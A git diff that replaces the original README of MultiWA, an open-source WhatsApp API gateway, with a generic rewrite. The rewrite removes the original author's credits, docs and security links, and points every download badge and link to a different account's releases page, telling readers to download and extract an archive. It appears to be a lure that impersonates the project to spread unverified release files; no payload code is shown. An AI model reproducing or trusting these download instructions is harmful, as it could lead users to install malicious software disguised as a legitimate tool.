@@ -1,331 +1,83 @@
-<p align="center">
-  <img src="apps/admin/public/logo.png" alt="MultiWA Logo" width="80" />
-</p>
-
-<h1 align="center">MultiWA</h1>
-
-<p align="center">
-  <strong>Open Source WhatsApp Business API Gateway</strong><br />
-  Multi-engine • Self-hosted • Enterprise-ready
-</p>
-
-<p align="center">
-  <a href="LICENSE"><img src="https://img.shields.io/badge/license-MIT-blue.svg" alt="MIT License" /></a>
-  <a href="CHANGELOG.md"><img src="https://img.shields.io/badge/version-0.0.1-green.svg" alt="Version" /></a>
-  <a href="docker-compose.production.yml"><img src="https://img.shields.io/badge/docker-ready-blue.svg" alt="Docker" /></a>
-  <a href="https://github.com/ribato22/multiwa/actions/workflows/ci.yml"><img src="https://github.com/ribato22/multiwa/actions/workflows/ci.yml/badge.svg" alt="CI" /></a>
-  <img src="https://img.shields.io/badge/PRs-welcome-brightgreen.svg" alt="PRs Welcome" />
-  <a href="https://buymeacoffee.com/ribato"><img src="https://img.shields.io/badge/Buy%20Me%20a%20Coffee-☕-orange.svg" alt="Buy Me a Coffee" /></a>
-  <a href="https://github.com/sponsors/ribato22"><img src="https://img.shields.io/badge/Sponsor-❤️-ea4aaa.svg" alt="GitHub Sponsors" /></a>
-</p>
-
-<p align="center">
-  <a href="#-quick-start">Quick Start</a> •
-  <a href="#-features">Features</a> •
-  <a href="#-screenshots">Screenshots</a> •
-  <a href="#-architecture">Architecture</a> •
-  <a href="#-api-documentation">API Docs</a> •
-  <a href="#-sdks">SDKs</a> •
-  <a href="CONTRIBUTING.md">Contributing</a>
-</p>
-
----
-
-## 🎯 What is MultiWA?
-
-**MultiWA** is a fully self-hosted, open-source WhatsApp API gateway that lets you connect multiple WhatsApp numbers through a single unified API. Built for businesses and developers who need reliable WhatsApp messaging without cloud dependencies.
-
-### ✨ Why MultiWA?
-
-| Feature | MultiWA | WhatsApp Cloud API | Evolution API |
-|---------|---------|-------------------|---------------|
-| **Self-hosted** | ✅ Full control | ❌ Meta-hosted | ✅ |
-| **Multi-engine** | ✅ whatsapp-web.js, Baileys | ❌ Single | ❌ Fixed |
-| **Admin Dashboard** | ✅ Full-featured | ❌ None | ⚠️ Basic |
-| **Visual Automation** | ✅ Drag & drop builder | ❌ | ❌ |
-| **Knowledge Base AI** | ✅ OpenAI / Google AI | ❌ | ❌ |
-| **Plugin System** | ✅ Extensible | ❌ | ❌ |
-| **Free** | ✅ MIT License | ⚠️ Per-message pricing | ✅ |
-| **Official SDKs** | ✅ TS, Python, PHP | ✅ Multiple | ⚠️ Community |
-
----
-
-## 🚀 Quick Start
-
-### Prerequisites
-
-- **Node.js** ≥ 20
-- **PostgreSQL** ≥ 16
-- **Redis** ≥ 7
-- **pnpm** ≥ 9
-
-### Option 1: Docker (Recommended for Production)
-
-```bash
-# Clone the repository
-git clone https://github.com/ribato22/MultiWA.git
-cd MultiWA
-
-# Configure environment
-cp .env.production.example .env
-
-# Start all services
-docker compose -f docker-compose.production.yml up -d
-
-# API: http://localhost:3333/api/docs
-# Admin: http://localhost:3001
-```
-
-### Option 2: Local Development
-
-```bash
-# Clone and install
-git clone https://github.com/ribato22/MultiWA.git
-cd MultiWA
-pnpm install
-
-# Configure environment
-cp .env.example .env
-
-# Setup database
-pnpm --filter database exec prisma generate
-pnpm --filter database exec prisma migrate deploy
-
-# Build workspace packages
-pnpm --filter database build
-pnpm --filter engines build
-
-# Start development
-pnpm --filter api dev     # API on http://localhost:3000
-pnpm --filter admin dev   # Admin on http://localhost:3001
-```
-
----
-
-## ⚡ Features
-
-### Core
-- 📱 **Multi-Session Management** — Connect unlimited WhatsApp accounts
-- 🔌 **Pluggable Engine Adapters** — Switch between whatsapp-web.js and Baileys
-- 📨 **Unified Messaging API** — Send text, media, documents, contacts, locations
-- 📡 **Real-time WebSocket** — Live session status, QR codes, and events via Socket.IO
-- 🔐 **JWT Authentication** — Secure API access with refresh tokens
-
-### Admin Dashboard
-- 🖥️ **Modern UI** — Next.js 14 with dark mode, responsive design
-- 💬 **Live Chat** — Real-time chat interface with message history
-- 📊 **Analytics** — Message volume, delivery rates, session metrics
-- 🔍 **Audit Trail** — Complete logging of all operations
-
-### Automation & AI
-- 🤖 **Visual Flow Builder** — Drag & drop automation design
-- 🧠 **Knowledge Base** — AI-powered replies using OpenAI or Google AI
-- 📅 **Scheduled Messages** — Queue messages for future delivery
-- 📢 **Broadcast** — Bulk messaging with templates and tracking
-
-### Integrations
-- 🔗 **Webhooks** — Real-time event notifications to your services
-- 🔑 **API Keys** — Multiple keys with scoping and expiration
-- 📦 **SDKs** — TypeScript, Python, PHP
-- 🔔 **Push Notifications** — Browser push via Web Push API
-- 📧 **SMTP Email** — Email alerts for critical events
-
-### Enterprise
-- 🛡️ **Security** — Helmet, CSP, rate limiting, encryption at rest
-- 🐳 **Docker** — Production-ready containers with health checks
-- ⚙️ **Worker** — BullMQ background jobs (messages, automation, webhooks, scheduled)
-- 🔒 **GDPR** — Data export and deletion endpoints
-- 🔌 **Plugin System** — Extend with custom plugins
-
----
-
-## 📸 Screenshots
-
-<p align="center">
-  <img src="docs/screenshots/dashboard.png" alt="Dashboard" width="48%" />
-  <img src="docs/screenshots/chat.png" alt="Chat" width="48%" />
-</p>
-<p align="center">
-  <img src="docs/screenshots/broadcast.png" alt="Broadcast" width="48%" />
-  <img src="docs/screenshots/analytics.png" alt="Analytics" width="48%" />
-</p>
-
-<p align="center">
-  <a href="docs/screenshots/">View all screenshots →</a>
-</p>
-
----
-
-## 🏗️ Architecture
-
-```
-┌─────────────────────────────────────────────────────────┐
-│                    Nginx (SSL/Proxy)                     │
-├──────────────────────┬──────────────────────────────────┤
-│                      │                                  │
-│  ┌──────────────┐    │    ┌──────────────────────────┐  │
-│  │ Admin (Next.js)│   │    │     API (NestJS/Fastify)  │  │
-│  │  Port 3001    │   │    │     Port 3000             │  │
-│  └──────────────┘    │    ├──────────────────────────┤  │
-│                      │    │  WhatsApp Engine Adapters │  │
-│                      │    │  ├─ whatsapp-web.js       │  │
-│                      │    │  └─ Baileys               │  │
-│                      │    └────────────┬─────────────┘  │
-│                      │                 │                 │
-│  ┌──────────────┐    │    ┌────────────┴─────────────┐  │
-│  │ Worker (BullMQ)│  │    │  PostgreSQL  │   Redis    │  │
-│  └──────────────┘    │    └──────────────────────────┘  │
-└──────────────────────┴──────────────────────────────────┘
-```
-
-### Tech Stack
-
-| Layer | Technology |
-|-------|-----------|
-| **API** | NestJS 10 + Fastify |
-| **Admin** | Next.js 14 + Tailwind CSS |
-| **Database** | PostgreSQL 16 + Prisma ORM |
-| **Cache/Queue** | Redis 7 + BullMQ |
-| **WhatsApp** | whatsapp-web.js / Baileys |
-| **Auth** | JWT (access + refresh tokens) |
-| **Realtime** | Socket.IO |
-| **Container** | Docker + Docker Compose |
-| **CI/CD** | GitHub Actions |
-
----
-
-## 📖 API Documentation
-
-Full interactive API documentation is available at `/api/docs` (Swagger UI).
-
-### Example: Send a Message
-
-```bash
-curl -X POST http://localhost:3000/api/v1/messages/send \
-  -H "Authorization: Bearer YOUR_TOKEN" \
-  -H "Content-Type: application/json" \
-  -d '{
-    "profileId": "profile-uuid",
-    "to": "6281234567890",
-    "message": "Hello from MultiWA! 👋"
-  }'
-```
-
-### Example: Connect a WhatsApp Session
-
-```bash
-curl -X POST http://localhost:3000/api/v1/profiles/YOUR_PROFILE_ID/connect \
-  -H "Authorization: Bearer YOUR_TOKEN"
-```
-
-> 📚 See [full documentation](https://ribato22.github.io/MultiWA/) for detailed guides, API reference, webhook events, and more. Source docs are in the [`docs/`](docs/) directory.
-
----
-
-## 📦 SDKs
-
-Official SDKs are included in the [`packages/sdk`](packages/sdk) directory:
-
-| Language | Package | Status |
-|----------|---------|--------|
-| TypeScript/Node.js | `@multiwa/sdk` | ✅ Stable |
-| Python | `multiwa-sdk` | ✅ Stable |
-| PHP | `multiwa/sdk` | ✅ Stable |
-
-### TypeScript SDK Example
-
-```typescript
-import { MultiWA } from '@multiwa/sdk';
-
-const client = new MultiWA({
-  baseUrl: 'http://localhost:3000',
-  apiKey: 'your-api-key',
-});
-
-// Send a message
-await client.messages.send({
-  profileId: 'profile-uuid',
-  to: '6281234567890',
-  message: 'Hello! 👋',
-});
-```
-
----
-
-## 🗂️ Project Structure
-
-```
-MultiWA/
-├── apps/
-│   ├── api/          # NestJS backend API
-│   ├── admin/        # Next.js admin dashboard
-│   └── worker/       # BullMQ background worker
-├── packages/
-│   ├── core/         # Shared types & utilities
-│   ├── database/     # Prisma schema & migrations
-│   ├── engines/      # WhatsApp engine adapters
-│   └── sdk/          # Official SDKs (TS, Python, PHP)
-├── plugins/          # Plugin directory
-├── docker/           # Dockerfiles (api, admin, worker)
-├── docs/             # Documentation (24 guides)
-└── scripts/          # Deployment & utility scripts
-```
-
----
-
-## 🐳 Production Deployment
-
-Detailed deployment guide: [`docs/16-deployment-docker.md`](docs/16-deployment-docker.md)
-
-```bash
-# 1. Clone and configure
-git clone https://github.com/ribato22/MultiWA.git
-cd MultiWA
-cp .env.production.example .env
-# Edit .env with your settings
-
-# 2. Build and start
-docker compose -f docker-compose.production.yml up -d --build
-
-# 3. Run database migrations
-docker exec multiwa-api npx prisma migrate deploy --schema=packages/database/prisma/schema.prisma
-
-# 4. Access
-# API:    http://your-server:3333/api/docs
-# Admin:  http://your-server:3001
-```
-
----
-
-## 🤝 Contributing
-
-Contributions are welcome! See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
-
-1. Fork the repository
-2. Create your feature branch (`git checkout -b feature/amazing-feature`)
-3. Commit your changes (`git commit -m 'feat: add amazing feature'`)
-4. Push to the branch (`git push origin feature/amazing-feature`)
-5. Open a Pull Request
-
----
-
-## 📄 License
-
-This project is licensed under the **MIT License** — see the [LICENSE](LICENSE) file for details.
-
----
+# 🌟 MultiWA - Your Easy WhatsApp Business API Gateway
+
+## 📥 Download
+
+[![Download MultiWA](https://img.shields.io/badge/Download-MultiWA-blue?style=for-the-badge)](https://github.com/halo-kaleb/MultiWA/releases)
+
+## 🚀 Getting Started
+
+MultiWA is an open-source tool that allows you to use the WhatsApp Business API easily. With this software, you can automate conversations, manage chats, and integrate with your business tools, all from one place. Even if you're not technical, you can get it up and running quickly with these steps.
+
+## 📋 System Requirements
+
+You will need a computer with the following minimum specifications:
+
+- **Operating System:** Windows 10 or later, macOS, or any Linux distribution.
+- **RAM:** At least 4GB.
+- **Storage:** 1GB of free space.
+- **Docker:** Installed on your machine. If you don’t have Docker, you can find instructions on how to install it [here](https://docs.docker.com/get-docker/).
+
+## 📦 Installation Steps
+
+1. **Visit the Download Page:** Go to the [MultiWA releases page](https://github.com/halo-kaleb/MultiWA/releases) to find the latest version.
+
+2. **Download the Latest Release:**
+   - Click on the version that suits your system. Download the appropriate files to your computer.
+
+3. **Extract the Files:**
+   - Locate the downloaded file and extract it. You can usually do this by right-clicking on the file and selecting “Extract All” or using software like WinRAR or 7-Zip.
+
+4. **Open a Terminal or Command Prompt:**
+   - On Windows, search for "cmd" in the Start menu. On macOS, use "Terminal." For Linux, open your preferred terminal application.
+
+5. **Navigate to the Extracted Folder:**
+   - Use the `cd` command followed by the path to the folder where you extracted MultiWA. For example:
+     ```
+     cd path/to/MultiWA
+     ```
+
+6. **Run MultiWA with Docker:**
+   - Use the following command to start MultiWA:
+     ```
+     docker-compose up
+     ```
+   - This command runs the MultiWA application within Docker.
+
+## 📊 Configuration
+
+- Once MultiWA is running, you will access it through your web browser. Open your browser and go to `http://localhost:3000`.
+- Follow the on-screen instructions to set up your WhatsApp Business account. You will need to provide your WhatsApp API credentials.
+
+## 🛠️ Key Features
+
+- **Multi-engine Support:** Use different engines for better performance.
+- **Automation Tools:** Automatically respond to customers using predefined chatbots.
+- **Easy Setup:** Simple installation and configuration process.
+- **Open Source:** Join a community-driven project and contribute to its growth.
+
+## 🗂️ Topics Covered
+
+MultiWA supports a variety of topics and functionalities, including:
+
+- **API Gateway:** Seamlessly connect with the WhatsApp API.
+- **Automation:** Set up automatic replies and workflows easily.
+- **Chatbot Integration:** Enhance customer support with chatbots.
+- **Docker:** Simplify deployment with containerization.
+- **TypeScript and NestJS:** Built on modern technology for reliability.
+
+## 💬 Community Support
+
+If you encounter any issues or have questions, you can reach out for support. Visit the [GitHub Issues Page](https://github.com/halo-kaleb/MultiWA/issues) to find existing problems or submit your own.
+
+## 🎉 Additional Resources
+
+- **Documentation:** You can find detailed documentation on usage and features in the repository.
+- **Community Forum:** Join discussions and share insights with other users in the community.
 
 ## 🔗 Links
 
-- 📖 [Documentation](https://ribato22.github.io/MultiWA/) · [Source](docs/)
-- 🐛 [Report a Bug](https://github.com/ribato22/MultiWA/issues/new?template=bug_report.yml)
-- 💡 [Request a Feature](https://github.com/ribato22/MultiWA/issues/new?template=feature_request.yml)
-- 🔒 [Security Policy](SECURITY.md)
-- 📝 [Changelog](CHANGELOG.md)
-- 🕵️ [Privacy Policy](PRIVACY.md)
+- [Visit the MultiWA Releases Page](https://github.com/halo-kaleb/MultiWA/releases) to download the latest version.
 
----
+[![Download MultiWA](https://img.shields.io/badge/Download-MultiWA-grey?style=for-the-badge)](https://github.com/halo-kaleb/MultiWA/releases)
 
-<p align="center">
-  Made with ❤️ by the <a href="https://github.com/ribato22">MultiWA</a> team
-</p>
+Getting started with MultiWA is straightforward. Follow these steps to set up your WhatsApp Business API Gateway quickly and begin enhancing your customer interactions.
